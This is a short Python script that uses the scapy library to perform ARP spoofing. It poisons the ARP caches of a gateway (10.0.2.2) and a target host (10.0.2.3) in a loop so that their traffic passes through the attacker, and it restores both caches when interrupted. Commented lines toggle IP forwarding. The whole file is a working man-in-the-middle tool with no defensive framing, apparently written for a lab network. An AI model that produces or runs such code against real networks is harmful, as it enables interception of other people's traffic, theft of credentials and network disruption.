#!/usr/bin/env python3

#import subprocess
import scapy.all as scapy
import time

gateway_ip = "10.0.2.2"
target_ip = "10.0.2.3"

# Enable/Disable port forwarding (Sudo)
#subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
#subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.summary())
    #print(packet.show())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.summary())
    scapy.send(packet, verbose=False)

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        #sent_packets_count = 0
        #sent_packets_count = sent_packets_count + 2
        #print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[-] Script interrupted (Ctrl + C)")
